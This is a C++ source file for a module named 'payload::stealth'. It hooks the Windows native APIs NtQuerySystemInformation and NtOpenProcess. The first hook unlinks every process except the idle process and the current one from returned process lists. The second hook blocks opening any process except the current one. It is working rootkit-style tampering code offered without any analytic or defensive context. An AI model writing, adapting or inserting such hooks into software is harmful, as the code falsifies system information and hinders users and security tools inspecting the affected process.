#include "ntdefs.hpp"
#include "hook.hpp"

static mc::hook_t< nt::query_system_information_fn > o_qsi;
static mc::hook_t< nt::open_process_fn > o_open_proc;

static auto NTAPI hk_qsi( ULONG cls, PVOID buf, ULONG len, PULONG ret ) -> NTSTATUS
{
    auto status = o_qsi.call( cls, buf, len, ret );

    if ( status < 0 || cls != nt::system_process_information )
        return status;

    auto self = static_cast< ULONG_PTR >( GetCurrentProcessId( ) );
    auto* cur = static_cast< nt::system_process_info_t* >( buf );
    nt::system_process_info_t* prev = nullptr;

    for ( ;; )
    {
        auto pid = reinterpret_cast< ULONG_PTR >( cur->unique_process_id );

        if ( pid == 0 || pid == self )
            prev = cur;
        else if ( prev )
            prev->next_entry_offset += cur->next_entry_offset;

        if ( !cur->next_entry_offset )
        {
            if ( prev && prev != cur ) prev->next_entry_offset = 0;
            break;
        }

        cur = reinterpret_cast< nt::system_process_info_t* >(
            reinterpret_cast< std::uint8_t* >( cur ) + cur->next_entry_offset );
    }

    return status;
}

static auto NTAPI hk_open_proc( PHANDLE h, ACCESS_MASK a, POBJECT_ATTRIBUTES oa, nt::client_id_t* cid ) -> NTSTATUS
{
    if ( !cid || reinterpret_cast< ULONG_PTR >( cid->unique_process ) != GetCurrentProcessId( ) )
        return nt::status_unsuccessful;

    return o_open_proc.call( h, a, oa, cid );
}

namespace payload::stealth
{
    auto install( ) -> void
    {
        o_qsi.install( nt::resolve( "NtQuerySystemInformation" ), hk_qsi );
    }

    auto install_process_guard( ) -> void
    {
        o_open_proc.install( nt::resolve( "NtOpenProcess" ), hk_open_proc );
    }
}
